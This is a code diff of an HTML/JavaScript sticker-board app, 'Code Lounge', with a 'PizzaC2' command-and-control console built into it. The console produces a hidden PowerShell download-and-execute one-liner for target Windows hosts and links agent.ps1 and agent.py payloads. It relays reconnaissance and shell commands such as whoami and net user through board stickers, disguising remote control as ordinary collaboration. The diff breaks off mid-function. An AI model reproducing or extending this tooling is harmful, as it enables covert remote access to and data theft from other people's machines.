+    .c2-custom-cmd {
+      margin-top: 14px;
+    }
+    .c2-custom-cmd label {
+      display: block;
+      margin-bottom: 8px;
+      font-size: 13px;
+      font-weight: 800;
+      color: var(--ink);
+    }
+    .c2-cmd-input {
+      width: 100% !important;
+      min-height: 80px;
+      padding: 12px 14px;
+      border: 1.5px solid var(--line);
+      border-radius: 12px;
+      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
+      font-size: 13px;
+      line-height: 1.5;
+      color: var(--ink);
+      background: rgba(0, 0, 0, 0.03);
+      resize: vertical;
+      box-sizing: border-box;
+      transition: border-color .18s ease, box-shadow .18s ease;
+    }
+    .c2-cmd-input:focus {
+      outline: none;
+      border-color: #0284c7;
+      box-shadow: 0 0 0 3px rgba(2, 132, 199, 0.2);
+    }
+    [data-theme="dark"] .c2-cmd-input {
+      background: #0b1320;
+      border-color: #1e293b;
+      color: #38bdf8;
+    }
+    [data-theme="dark"] .c2-cmd-input:focus {
+      border-color: #38bdf8;
+      box-shadow: 0 0 0 3px rgba(56, 189, 248, 0.25);
+    }
+    .c2-send-btn {
+      width: 100% !important;
+      min-height: 46px !important;
+      margin-top: 10px;
+      font-size: 14px;
+      font-weight: 800;
+      border-radius: 11px;
+    }
+    .c2-status-banner {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 10px 14px;
+      border-radius: 10px;
+      font-size: 12px;
+      font-weight: 600;
+      background: #f1f5f9;
+      color: #475569;
+      border: 1px solid #cbd5e1;
+    }
+    .c2-status-banner.online {
+      background: #ecfdf5;
+      color: #065f46;
+      border-color: #a7f3d0;
+    }
+    .c2-status-banner.offline {
+      background: #fff1f2;
+      color: #9f1239;
+      border-color: #fecdd3;
+    }
+    .c2-dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: currentColor;
+    }
+  </style>
+</head>
+<body>
+  <div class="shell">
+    <header>
+      <div class="brand">
+        <div class="brand-mark" aria-hidden="true">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.7" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M13 6l6 6-6 6"/></svg>
+        </div>
+        <span data-i18n="brand">입장코드 라운지</span>
+      </div>
+      <div class="header-controls">
+        <div class="status" data-i18n="status">현재 접속 가능</div>
+        <div class="lang-switch" role="group" aria-label="Language">
+          <button type="button" class="lang-btn" data-lang="ko">KO</button>
+          <button type="button" class="lang-btn active" data-lang="en">EN</button>
+        </div>
+        <a href="https://buymeacoffee.com/ralo2400" target="_blank" rel="noopener noreferrer" class="coffee-button" aria-label="Buy Me a Coffee">
+          <span class="coffee-icon">☕</span>
+          <span class="coffee-text" data-i18n="buyCoffee">Buy Me a Coffee</span>
+        </a>
+        <button id="themeToggleLounge" class="theme-toggle" type="button" aria-label="테마 전환">
+          <svg class="sun-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/></svg>
+          <svg class="moon-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3a6 6 0 0 0 9 9 9 9 0 1 1-9-9Z"/></svg>
+        </button>
+      </div>
+    </header>
+
+    <main>
+      <section class="intro">
+        <div class="eyebrow"><span aria-hidden="true"></span> <span data-i18n="eyebrow">QUICK ACCESS</span></div>
+        <h1 data-i18n="introTitle">함께할 준비,<br>코드 하나면 돼요.</h1>
+        <p data-i18n="introDesc">새로운 공간을 열거나, 친구가 건네준 6자리 코드로 바로 입장해 보세요.</p>
+      </section>
+
+      <section class="workspace" aria-label="입장코드 메뉴">
+        <article class="card">
+          <div class="card-number">01</div>
+          <h2 data-i18n="card1Title">입장코드 생성하기</h2>
+          <p data-i18n="card1Desc">친구를 초대할 수 있는 일반 코드와<br>관리자 전용 코드를 함께 만들어요.</p>
+          <div id="generatedCode" class="code-result" aria-live="polite">
+            <span class="code-label" data-i18n="codeLabelNormal">일반 사용자 코드</span>
+            <strong id="codeValue">000000</strong>
+            <button id="copyButton" class="copy-button" type="button" data-i18n="copy">복사하기</button>
+          </div>
+          <div id="generatedAdminCode" class="code-result admin-code" aria-live="polite">
+            <span class="code-label" data-i18n="codeLabelAdmin">관리자 전용 코드</span>
+            <strong id="adminCodeValue">000000</strong>
+            <button id="copyAdminButton" class="copy-button" type="button" data-i18n="copy">복사하기</button>
+          </div>
+          <button id="generateButton" class="primary" type="button" data-i18n="btnGenerate">무작위 코드 만들기</button>
+          <div id="generateMessage" class="message" aria-live="polite"></div>
+        </article>
+
+        <article class="card">
+          <div class="card-number">02</div>
+          <h2 data-i18n="card2Title">코드 입력하기</h2>
+          <p data-i18n="card2Desc">전달받은 코드를 입력하고<br>공간에 입장해요.</p>
+          <div id="inputArea" class="input-area">
+            <label for="entryCode" data-i18n="labelEntryCode">일반 입장코드 6자리</label>
+            <input id="entryCode" type="text" inputmode="numeric" maxlength="6" placeholder="숫자 6자리 입력" autocomplete="off">
+          </div>
+          <div id="roleChoice" class="role-choice">
+            <p data-i18n="roleQuestion">일반 사용자이신가요?</p>
+            <div class="role-buttons">
+              <button id="normalRoleButton" class="role-button selected" type="button" data-i18n="roleNormal">일반 사용자</button>
+              <button id="adminRoleButton" class="role-button" type="button" data-i18n="roleAdmin">관리자 입장</button>
+            </div>
+          </div>
+          <div id="adminInputArea" class="admin-input-area">
+            <label for="adminCodeInput" data-i18n="labelAdminCode">관리자 입장코드 6자리</label>
+            <input id="adminCodeInput" type="text" inputmode="numeric" maxlength="6" placeholder="관리자 코드 6자리 입력" autocomplete="off">
+          </div>
+          <div id="nicknameArea" class="nickname-area">
+            <label for="nickname" data-i18n="labelNickname">사용할 닉네임</label>
+            <input id="nickname" type="text" maxlength="16" placeholder="닉네임을 입력해 주세요" autocomplete="off">
+          </div>
+          <button id="entryButton" class="secondary" type="button" data-i18n="btnEntryInit">코드 입력하기</button>
+          <div id="entryMessage" class="message" aria-live="polite"></div>
+        </article>
+      </section>
+    </main>
+  </div>
+
+  <section id="appPage" class="app-page" aria-label="협업 보드">
+    <div class="app-topbar">
+      <div class="board-title">
+        <div class="board-dot" aria-hidden="true"></div>
+        <div>
+          <h1 data-i18n="boardHeading">우리들의 작은 보드</h1>
+          <p id="welcomeGreeting"><span id="welcomeName">게스트</span><span id="welcomeSuffix">님, 환영합니다</span></p>
+        </div>
+      </div>
+      <div class="top-actions">
+        <div id="hostControls" class="host-controls" aria-label="방장 관리 기능">
+          <button id="rotateCodeButton" class="host-action" type="button" data-i18n="rotateCode">코드 변경</button>
+          <button id="deleteRoomButton" class="host-action" type="button" data-i18n="deleteRoom">방 삭제</button>
+          <label class="code-switch"><span data-i18n="entryCodeLabel">입장코드</span>
+            <span class="switch">
+              <input id="codeEnabled" type="checkbox" checked>
+              <span class="switch-track"></span>
+            </span>
+            <span id="codeStatus">ON</span>
+          </label>
+        </div>
+        <div class="lang-switch" role="group" aria-label="Language">
+          <button type="button" class="lang-btn" data-lang="ko">KO</button>
+          <button type="button" class="lang-btn active" data-lang="en">EN</button>
+        </div>
+        <a href="https://buymeacoffee.com/ralo2400" target="_blank" rel="noopener noreferrer" class="coffee-button" aria-label="Buy Me a Coffee">
+          <span class="coffee-icon">☕</span>
+          <span class="coffee-text" data-i18n="buyCoffee">Buy Me a Coffee</span>
+        </a>
+        <button id="themeToggleBoard" class="theme-toggle" type="button" aria-label="테마 전환">
+          <svg class="sun-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/></svg>
+          <svg class="moon-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3a6 6 0 0 0 9 9 9 0 1 1-9-9Z"/></svg>
+        </button>
+        <div id="searchBox" class="search-box">
+          <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="11" cy="11" r="7"></circle><path d="m20 20-4-4"></path></svg>
+          <input id="searchInput" type="search" placeholder="스티커 검색" aria-label="스티커 검색">
+        </div>
+        <button id="searchButton" class="icon-button" type="button" aria-label="돋보기 열기">
+          <svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.3" stroke-linecap="round"><circle cx="11" cy="11" r="7"></circle><path d="m20 20-4-4"></path></svg>
+        </button>
+        <button id="addButton" class="icon-button plus-button" type="button" aria-label="스티커 추가">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round"><path d="M12 5v14M5 12h14"></path></svg>
+        </button>
+        <button id="c2ModalButton" class="icon-button c2-console-button" type="button" aria-label="PizzaC2 Console" title="PizzaC2 Console">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect><line x1="8" y1="21" x2="16" y2="21"></line><line x1="12" y1="17" x2="12" y2="21"></line><polyline points="7 8 10 10 7 12"></polyline><line x1="12" y1="12" x2="15" y2="12"></line></svg>
+        </button>
+      </div>
+    </div>
+
+    <div class="app-layout">
+      <section id="board" class="board" aria-label="스티커 보드">
+        <div id="boardEmpty" class="board-empty">
+          <div class="board-empty-content">
+            <svg width="35" height="35" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16v12H8l-4 4V4Z"></path><path d="M8 9h8M8 12h5"></path></svg>
+            <p id="boardEmptyText" data-i18n="boardEmpty">+ 버튼을 눌러 첫 번째 스티커를 남겨보세요.</p>
+          </div>
+        </div>
+      </section>
+
+      <aside class="users-panel" aria-label="접속중인 유저">
+        <div class="users-heading"><h2 data-i18n="usersHeading">접속중인 유저</h2><span id="userCount" class="user-count">1명</span></div>
+        <div id="userList">
+          <div class="user"><span id="myAvatar" class="avatar">나</span><span id="myUserName">게스트</span><span id="myCrown" class="host-crown" aria-label="방장">👑</span><span class="online-dot"></span></div>
+        </div>
+      </aside>
+    </div>
+  </section>
+
+  <div id="noteModal" class="modal-backdrop" role="dialog" aria-modal="true" aria-labelledby="noteModalTitle">
+    <form id="noteForm" class="note-modal">
+      <h2 id="noteModalTitle" data-i18n="modalNewTitle">새 스티커 남기기</h2>
+      <p id="noteModalDesc" data-i18n="modalNewDesc">보드에 공유하고 싶은 생각을 적어주세요.</p>
+      <textarea id="noteText" maxlength="180" placeholder="오늘의 아이디어, 할 일, 응원 한마디..."></textarea>
+      <div class="modal-actions">
+        <button id="cancelNote" class="cancel-button" type="button" data-i18n="modalCancel">취소</button>
+        <button id="noteSubmitButton" class="primary" type="submit" data-i18n="modalPost">보드에 붙이기</button>
+      </div>
+    </form>
+  </div>
+
+  <div id="deleteRoomModal" class="modal-backdrop" role="dialog" aria-modal="true" aria-labelledby="deleteRoomTitle">
+    <form id="deleteRoomForm" class="note-modal danger-modal">
+      <h2 id="deleteRoomTitle" data-i18n="deleteModalTitle">방을 완전히 삭제할까요?</h2>
+      <p id="deleteRoomDesc" data-i18n="deleteModalDesc">방과 메모장이 모두 삭제되고 접속 중인 유저도 퇴장합니다. 계속하려면 아래 문구를 정확히 입력해 주세요.</p>
+      <input id="deleteConfirmInput" type="text" autocomplete="off" placeholder="삭제하겠습니다">
+      <div class="modal-actions">
+        <button id="cancelDeleteButton" class="cancel-button" type="button" data-i18n="modalCancel">취소</button>
+        <button id="confirmDeleteButton" class="danger-button" type="submit" disabled data-i18n="deleteModalButton">방 삭제</button>
+      </div>
+    </form>
+  </div>
+
+  <div id="c2Modal" class="modal-backdrop" role="dialog" aria-modal="true" aria-labelledby="c2ModalTitle">
+    <div class="note-modal c2-modal-card">
+      <div class="c2-modal-header">
+        <span class="c2-title-badge">LOTS C2 CONSOLE</span>
+        <button id="closeC2Modal" class="note-close" type="button" aria-label="닫기">×</button>
+      </div>
+      <h2 id="c2ModalTitle" style="margin-top:4px;">🍕 PizzaC2 제어판</h2>
+      <p class="c2-modal-subtitle">스티커 보드를 경유하는 Living Off Trusted Sites 명령 제어</p>
+
+      <div class="c2-tabs">
+        <button type="button" class="c2-tab-btn active" data-tab="deploy">에이전트 배포</button>
+        <button type="button" class="c2-tab-btn" data-tab="command">명령어 실행</button>
+        <button type="button" class="c2-tab-btn" data-tab="config">C2 서버 설정</button>
+      </div>
+
+      <!-- Tab 1: Deploy -->
+      <div id="c2TabDeploy" class="c2-tab-content active">
+        <div class="c2-field">
+          <label>타겟 실행용 PowerShell 1-Liner (룸 코드: <strong id="c2CurrentRoomCode">------</strong>)</label>
+          <div class="c2-code-box">
+            <code id="c2OneLinerCode">powershell -w hidden -nop -c "iex(New-Object Net.WebClient).DownloadString('...')"</code>
+            <button id="copyOneLinerBtn" type="button" class="c2-copy-btn">복사</button>
+          </div>
+        </div>
+        <div class="c2-btn-group">
+          <a id="downloadPs1Btn" class="c2-action-btn" target="_blank">📥 agent.ps1 받기</a>
+          <a id="downloadPyBtn" class="c2-action-btn" target="_blank">📥 agent.py 받기</a>
+        </div>
+        <div class="c2-guide-box">
+          💡 <strong>LOTS C2 동작 프로세스:</strong>
+          <ol>
+            <li>타겟 호스트(Windows)에서 위 1-Liner 명령어를 실행합니다.</li>
+            <li>에이전트가 본 라운지에 🤖 유저로 자동 잠입하여 스티커를 감시합니다.</li>
+            <li><code>!whoami</code> 또는 빠른 명령으로 스티커를 붙이면 결과가 스티커로 반환됩니다.</li>
+          </ol>
+        </div>
+      </div>
+
+      <!-- Tab 2: Quick Command -->
+      <div id="c2TabCommand" class="c2-tab-content">
+        <label style="font-size:12px; font-weight:700; color:var(--muted);">원클릭 정찰 명령 (클릭 시 스티커로 즉시 전송)</label>
+        <div class="c2-quick-commands">
+          <button type="button" class="c2-cmd-chip" data-cmd="!whoami">!whoami</button>
+          <button type="button" class="c2-cmd-chip" data-cmd="!hostname">!hostname</button>
+          <button type="button" class="c2-cmd-chip" data-cmd="!ipconfig">!ipconfig</button>
+          <button type="button" class="c2-cmd-chip" data-cmd="!sysinfo">!sysinfo</button>
+          <button type="button" class="c2-cmd-chip" data-cmd="!ps">!ps</button>
+          <button type="button" class="c2-cmd-chip" data-cmd="!dir C:\">!dir C:\</button>
+          <button type="button" class="c2-cmd-chip" data-cmd="!net user">!net user</button>
+        </div>
+        <div class="c2-custom-cmd">
+          <label for="c2CustomCmdInput">수동 셸 명령 입력</label>
+          <textarea id="c2CustomCmdInput" class="c2-cmd-input" rows="3" placeholder="실행할 셸 명령어를 입력하세요 (예: whoami, ipconfig /all, net user, dir C:\ 등)&#10;Enter를 누르면 즉시 스티커로 전송됩니다."></textarea>
+          <button id="c2SendCmdBtn" type="button" class="primary c2-send-btn">스티커 전송</button>
+        </div>
+      </div>
+
+      <!-- Tab 3: Config -->
+      <div id="c2TabConfig" class="c2-tab-content">
+        <div class="c2-field">
+          <label for="c2ServerUrlInput">C2 Relay 서버 주소</label>
+          <input id="c2ServerUrlInput" type="text" value="http://127.0.0.1:8080" style="width:100%; height:42px; padding:0 12px; border:1px solid var(--line); border-radius:10px;">
+        </div>
+        <div class="c2-status-banner" id="c2StatusBanner">
+          <span class="c2-dot"></span> <span id="c2StatusText">연결 상태 확인 중...</span>
+        </div>
+        <button id="c2SaveConfigBtn" type="button" class="secondary" style="width:100%; margin-top:12px;">연결 테스트 및 저장</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const translations = {
+      ko: {
+        pageTitleLounge: '입장코드 라운지',
+        pageTitleBoard: '우리들의 작은 보드',
+        brand: '입장코드 라운지',
+        status: '현재 접속 가능',
+        eyebrow: 'QUICK ACCESS',
+        introTitle: '함께할 준비,<br>코드 하나면 돼요.',
+        introDesc: '새로운 공간을 열거나, 친구가 건네준 6자리 코드로 바로 입장해 보세요.',
+        card1Title: '입장코드 생성하기',
+        card1Desc: '친구를 초대할 수 있는 일반 코드와<br>관리자 전용 코드를 함께 만들어요.',
+        codeLabelNormal: '일반 사용자 코드',
+        codeLabelAdmin: '관리자 전용 코드',
+        copy: '복사하기',
+        copied: '복사 완료',
+        btnGenerate: '무작위 코드 만들기',
+        msgGenerated: '입장코드가 준비됐어요.',
+        card2Title: '코드 입력하기',
+        card2Desc: '전달받은 코드를 입력하고<br>공간에 입장해요.',
+        labelEntryCode: '일반 입장코드 6자리',
+        phEntryCode: '숫자 6자리 입력',
+        roleQuestion: '일반 사용자이신가요?',
+        roleNormal: '일반 사용자',
+        roleAdmin: '관리자 입장',
+        labelAdminCode: '관리자 입장코드 6자리',
+        phAdminCode: '관리자 코드 6자리 입력',
+        labelNickname: '사용할 닉네임',
+        phNickname: '닉네임을 입력해 주세요',
+        btnEntryInit: '코드 입력하기',
+        btnEntryCheck: '확인하기',
+        btnEntryJoin: '입장하기',
+        errDigits6: '숫자 6자리를 입력해 주세요.',
+        errDeletedRoom: '삭제된 방의 입장코드입니다.',
+        errCodeOff: '이 방의 입장코드는 현재 OFF 상태입니다.',
+        errAdminDigits6: '관리자 입장코드 6자리를 입력해 주세요.',
+        errWrongCode: '일반 입장코드 또는 관리자 입장코드가 올바르지 않아요.',
+        errNicknameRequired: '닉네임을 입력해 주세요.',
+        msgCodeVerified: '코드가 맞아요. 사용할 닉네임을 입력해 주세요.',
+        footerLeft: 'WELCOME IN',
+        footerRight: 'made for your next room',
+        boardHeading: '우리들의 작은 보드',
+        welcomeSuffix: '님, 환영합니다',
+        rotateCode: '코드 변경',
+        deleteRoom: '방 삭제',
+        entryCodeLabel: '입장코드',
+        searchPlaceholder: '스티커 검색',
+        boardEmpty: '+ 버튼을 눌러 첫 번째 스티커를 남겨보세요.',
+        usersHeading: '접속중인 유저',
+        userCountSuffix: '명',
+        myBadge: '나',
+        kickButton: '강퇴',
+        hostAria: '방장',
+        noteEdit: '편집',
+        noteDeleteAria: '스티커 삭제',
+        noteCopy: '복사',
+        noteCopied: '복사 완료',
+        modalNewTitle: '새 스티커 남기기',
+        modalEditTitle: '#{n} 스티커 편집',
+        modalNewDesc: '보드에 공유하고 싶은 생각을 적어주세요.',
+        modalPlaceholder: '오늘의 아이디어, 할 일, 응원 한마디...',
+        modalCancel: '취소',
+        modalPost: '보드에 붙이기',
+        modalSave: '저장하기',
+        deleteModalTitle: '방을 완전히 삭제할까요?',
+        deleteModalDesc: '방과 메모장이 모두 삭제되고 접속 중인 유저도 퇴장합니다. 계속하려면 아래 문구를 정확히 입력해 주세요.',
+        deletePhrase: '삭제하겠습니다',
+        deleteModalButton: '방 삭제',
+        alertRotate: '새 일반 입장코드: {code}\n새 관리자 입장코드: {adminCode}',
+        alertKicked: '방장에 의해 방에서 퇴장되었습니다.',
+        alertDeleted: '방장이 방을 삭제했습니다.',
+        themeAria: '테마 전환',
+        buyCoffee: '커피 후원하기',
+        c2Console: 'PizzaC2 제어판',
+        c2Desc: '스티커 보드를 경유하는 Living Off Trusted Sites 명령 제어',
+        c2StatusOnline: '🟢 PizzaC2: 활성',
+        c2StatusOffline: '현재 접속 가능'
+      },
+      en: {
+        pageTitleLounge: 'Entry Code Lounge',
+        pageTitleBoard: 'Our Little Board',
+        brand: 'Code Lounge',
+        status: 'Online & Ready',
+        eyebrow: 'QUICK ACCESS',
+        introTitle: 'Ready together,<br>all it takes is a code.',
+        introDesc: 'Open a brand new space or join instantly with a 6-digit code from a friend.',
+        card1Title: 'Create Entry Code',
+        card1Desc: 'Generate a standard invite code and<br>an admin pass code together.',
+        codeLabelNormal: 'Guest Code',
+        codeLabelAdmin: 'Admin Code',
+        copy: 'Copy',
+        copied: 'Copied!',
+        btnGenerate: 'Generate Random Code',
+        msgGenerated: 'Entry codes are ready.',
+        card2Title: 'Enter Room Code',
+        card2Desc: 'Enter the received code<br>and enter the space.',
+        labelEntryCode: '6-digit Entry Code',
+        phEntryCode: 'Enter 6 digits',
+        roleQuestion: 'Are you a guest or admin?',
+        roleNormal: 'Guest User',
+        roleAdmin: 'Admin Access',
+        labelAdminCode: '6-digit Admin Code',
+        phAdminCode: 'Enter 6-digit admin code',
+        labelNickname: 'Your Nickname',
+        phNickname: 'Enter your nickname',
+        btnEntryInit: 'Enter Code',
+        btnEntryCheck: 'Verify Code',
+        btnEntryJoin: 'Join Room',
+        errDigits6: 'Please enter 6 digits.',
+        errDeletedRoom: 'This room has been deleted.',
+        errCodeOff: "This room's entry code is currently OFF.",
+        errAdminDigits6: 'Please enter the 6-digit admin code.',
+        errWrongCode: 'The entry code or admin code is incorrect.',
+        errNicknameRequired: 'Please enter a nickname.',
+        msgCodeVerified: 'Code verified! Please enter your nickname.',
+        footerLeft: 'WELCOME IN',
+        footerRight: 'made for your next room',
+        boardHeading: 'Our Little Board',
+        welcomeSuffix: ', Welcome!',
+        rotateCode: 'Rotate Code',
+        deleteRoom: 'Delete Room',
+        entryCodeLabel: 'Entry Code',
+        searchPlaceholder: 'Search stickers',
+        boardEmpty: 'Press the + button to post the first sticker.',
+        usersHeading: 'Online Users',
+        userCountSuffix: ' online',
+        myBadge: 'Me',
+        kickButton: 'Kick',
+        hostAria: 'Host',
+        noteEdit: 'Edit',
+        noteDeleteAria: 'Delete sticker',
+        noteCopy: 'Copy',
+        noteCopied: 'Copied!',
+        modalNewTitle: 'Post a New Sticker',
+        modalEditTitle: 'Edit Sticker #{n}',
+        modalNewDesc: 'Share thoughts, tasks, or words of encouragement.',
+        modalPlaceholder: "Today's idea, to-do list, or a warm cheer...",
+        modalCancel: 'Cancel',
+        modalPost: 'Post to Board',
+        modalSave: 'Save Changes',
+        deleteModalTitle: 'Permanently delete this room?',
+        deleteModalDesc: 'The room and all notes will be deleted and active users removed. Type the phrase below to proceed.',
+        deletePhrase: 'DELETE',
+        deleteModalButton: 'Delete Room',
+        alertRotate: 'New Guest Code: {code}\nNew Admin Code: {adminCode}',
+        alertKicked: 'You were removed from the room by the host.',
+        alertDeleted: 'The host deleted the room.',
+        themeAria: 'Toggle Theme',
+        buyCoffee: 'Buy Me a Coffee',
+        c2Console: 'PizzaC2 Console',
+        c2Desc: 'Living Off Trusted Sites C2 via Board Stickers',
+        c2StatusOnline: '🟢 PizzaC2: Active',
+        c2StatusOffline: 'Online & Ready'
+      }
+    };
+
+    const generateButton = document.querySelector('#generateButton');
+    const generatedCode = document.querySelector('#generatedCode');
+    const codeValue = document.querySelector('#codeValue');
+    const copyButton = document.querySelector('#copyButton');
+    const generatedAdminCode = document.querySelector('#generatedAdminCode');
+    const adminCodeValue = document.querySelector('#adminCodeValue');
+    const copyAdminButton = document.querySelector('#copyAdminButton');
+    const generateMessage = document.querySelector('#generateMessage');
+    const entryButton = document.querySelector('#entryButton');
+    const inputArea = document.querySelector('#inputArea');
+    const entryCode = document.querySelector('#entryCode');
+    const roleChoice = document.querySelector('#roleChoice');
+    const normalRoleButton = document.querySelector('#normalRoleButton');
+    const adminRoleButton = document.querySelector('#adminRoleButton');
+    const adminInputArea = document.querySelector('#adminInputArea');
+    const adminCodeInput = document.querySelector('#adminCodeInput');
+    const nicknameArea = document.querySelector('#nicknameArea');
+    const nickname = document.querySelector('#nickname');
+    const entryMessage = document.querySelector('#entryMessage');
+    const shell = document.querySelector('.shell');
+    const appPage = document.querySelector('#appPage');
+    const welcomeName = document.querySelector('#welcomeName');
+    const welcomeSuffix = document.querySelector('#welcomeSuffix');
+    const myUserName = document.querySelector('#myUserName');
+    const myAvatar = document.querySelector('#myAvatar');
+    const myCrown = document.querySelector('#myCrown');
+    const userCount = document.querySelector('#userCount');
+    const userList = document.querySelector('#userList');
+    const searchButton = document.querySelector('#searchButton');
+    const searchBox = document.querySelector('#searchBox');
+    const searchInput = document.querySelector('#searchInput');
+    const addButton = document.querySelector('#addButton');
+    const board = document.querySelector('#board');
+    const boardEmpty = document.querySelector('#boardEmpty');
+    const noteModal = document.querySelector('#noteModal');
+    const noteForm = document.querySelector('#noteForm');
+    const noteText = document.querySelector('#noteText');
+    const cancelNote = document.querySelector('#cancelNote');
+    const noteModalTitle = document.querySelector('#noteModalTitle');
+    const noteSubmitButton = document.querySelector('#noteSubmitButton');
+    const hostControls = document.querySelector('#hostControls');
+    const rotateCodeButton = document.querySelector('#rotateCodeButton');
+    const deleteRoomButton = document.querySelector('#deleteRoomButton');
+    const codeEnabled = document.querySelector('#codeEnabled');
+    const codeStatus = document.querySelector('#codeStatus');
+    const deleteRoomModal = document.querySelector('#deleteRoomModal');
+    const deleteRoomForm = document.querySelector('#deleteRoomForm');
+    const deleteConfirmInput = document.querySelector('#deleteConfirmInput');
+    const cancelDeleteButton = document.querySelector('#cancelDeleteButton');
+    const confirmDeleteButton = document.querySelector('#confirmDeleteButton');
+
+    // PizzaC2 Elements
+    const c2ModalButton = document.querySelector('#c2ModalButton');
+    const c2Modal = document.querySelector('#c2Modal');
+    const closeC2Modal = document.querySelector('#closeC2Modal');
+    const c2TabBtns = document.querySelectorAll('.c2-tab-btn');
+    const c2TabContents = document.querySelectorAll('.c2-tab-content');
+    const c2CurrentRoomCode = document.querySelector('#c2CurrentRoomCode');
+    const c2OneLinerCode = document.querySelector('#c2OneLinerCode');
+    const copyOneLinerBtn = document.querySelector('#copyOneLinerBtn');
+    const downloadPs1Btn = document.querySelector('#downloadPs1Btn');
+    const downloadPyBtn = document.querySelector('#downloadPyBtn');
+    const c2CmdChips = document.querySelectorAll('.c2-cmd-chip');
+    const c2CustomCmdInput = document.querySelector('#c2CustomCmdInput');
+    const c2SendCmdBtn = document.querySelector('#c2SendCmdBtn');
+    const c2ServerUrlInput = document.querySelector('#c2ServerUrlInput');
+    const c2SaveConfigBtn = document.querySelector('#c2SaveConfigBtn');
+    const c2StatusBanner = document.querySelector('#c2StatusBanner');
+    const c2StatusText = document.querySelector('#c2StatusText');
+    const c2HeaderStatus = document.querySelector('#c2HeaderStatus') || document.querySelector('.status');
+
+    let activeCode = '';
+    let activeAdminCode = '';
+    let wantsAdmin = false;
+    let isHost = false;
+    let noteCount = 0;
+    let currentRoomCode = '';
+    let leavingRoom = false;
+    let editingNoteId = '';
+    const sessionId = `${Date.now()}-${Math.random().toString(36).slice(2)}`;
+
+    // PizzaC2 Controller Module
+    const C2 = {
+      serverUrl: localStorage.getItem('c2_server_url') || (window.location.protocol.startsWith('http') ? window.location.origin : 'http://127.0.0.1:8080'),
+      isConnected: false,
+      syncTimer: null,
+
+      init() {
+        if (c2ServerUrlInput) c2ServerUrlInput.value = this.serverUrl;
+        this.checkConnection();
+        this.syncTimer = setInterval(() => {
+          if (currentRoomCode) {
+            this.syncRoom(currentRoomCode);
+          }
+        }, 2000);
+      },
+
+      async checkConnection() {
+        try {
+          const res = await fetch(`${this.serverUrl}/api/status`, { mode: 'cors' });
+          if (res.ok) {
+            this.isConnected = true;
+            this.updateStatusBadge(true);
+            return true;
+          }
+        } catch (e) {}
+        this.isConnected = false;
+        this.updateStatusBadge(false);
+        return false;
+      },
+
+      updateStatusBadge(online) {
+        if (c2HeaderStatus) {
+          const t = translations[currentLang] || translations.ko;
+          c2HeaderStatus.textContent = online ? t.c2StatusOnline : t.c2StatusOffline;
+          c2HeaderStatus.title = online ? `PizzaC2 Relay Connected (${this.serverUrl})` : 'Running in Local Mode';
+        }
+        if (c2StatusBanner && c2StatusText) {
+          c2StatusBanner.className = `c2-status-banner ${online ? 'online' : 'offline'}`;
+          c2StatusText.textContent = online ? `C2 서버 정상 연결 (${this.serverUrl})` : 'C2 서버 연결 안 됨 (로컬 모드 동작 중)';
+        }
+      },
+
+      updatePayloadUI(code) {
+        if (c2CurrentRoomCode) c2CurrentRoomCode.textContent = code || '------';
+        const oneLiner = `powershell -w hidden -nop -c "iex(New-Object Net.WebClient).DownloadString('${this.serverUrl}/api/agent/ps1?code=${code}&server=${this.serverUrl}')"`;
+        if (c2OneLinerCode) c2OneLinerCode.textContent = oneLiner;
+        if (downloadPs1Btn) downloadPs1Btn.href = `${this.serverUrl}/api/agent/ps1?code=${code}&server=${this.serverUrl}`;
+        if (downloadPyBtn) downloadPyBtn.href = `${this.serverUrl}/api/agent/py?code=${code}&server=${this.serverUrl}`;
+      },
+
+      async syncRoom(code) {
+        if (!this.isConnected || !code) return;
+        try {
+          const [notesRes, presRes] = await Promise.all([
+            fetch(`${this.serverUrl}/api/rooms/${code}/notes`, { mode: 'cors' }),
+            fetch(`${this.serverUrl}/api/rooms/${code}/presence`, { mode: 'cors' })
+          ]);
+          if (notesRes.ok) {
+            const notesData = await notesRes.json();
+            if (Array.isArray(notesData.notes)) {
+              const allNotes = readRoomData('roomNotes');
+              const localNotes = allNotes[code] || [];
+              if (JSON.stringify(notesData.notes) !== JSON.stringify(localNotes)) {
+                allNotes[code] = notesData.notes;
+                saveRoomData('roomNotes', allNotes);
+                renderNotes();
+              }
+            }
+          }
+          if (presRes.ok) {
+            const presData = await presRes.json();
+            if (Array.isArray(presData.presence)) {
+              const presence = readRoomData('roomPresence');
+              let changed = false;
+              presData.presence.forEach((p) => {
+                if (!presence[p.id] || presence[p.id].lastSeen !== p.lastSeen) {
+                  presence[p.id] = { ...p, code };
+                  changed = true;
+                }
+              });
+              if (changed) {
